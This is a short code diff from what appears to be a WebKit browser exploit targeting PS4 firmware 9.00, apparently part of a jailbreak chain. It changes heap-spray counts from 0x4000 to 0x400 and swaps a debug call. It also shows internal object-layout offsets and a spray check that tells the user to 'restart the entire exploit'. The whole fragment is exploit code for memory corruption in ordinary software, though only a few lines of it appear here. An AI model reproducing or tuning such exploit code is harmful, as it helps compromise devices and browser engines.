@@ -1,7 +1,7 @@
  const ps4_9_00 = 2;
  const target = ps4_9_00;
  const ssv_len = 0x50;
- const num_reuse = 0x4000;
+ const num_reuse = 0x400;
  const js_butterfly = 0x8;
  const view_m_vector = 0x10;
  const view_m_length = 0x18;
@@ -13,7 +13,7 @@
  const size_strimpl = 0x18;
  const original_strlen = ssv_len - size_strimpl;
  const buffer_len = 0x20;
- const num_str = 0x4000;
+ const num_str = 0x400;
  const num_gc = 30;
  const num_space = 19;
  const original_loc = window.location.pathname;
@@ -65,7 +65,7 @@
  }
  function check_spray(views) {
     if (views.length !== num_reuse) {
-        debug_log(`views.length: ${views.length}`);
+        showMessage(`views.length: ${views.length}`);
         die('views.length !== num_reuse, restart the entire exploit');
     }
     for (let i = 0; i < num_reuse; i++) {
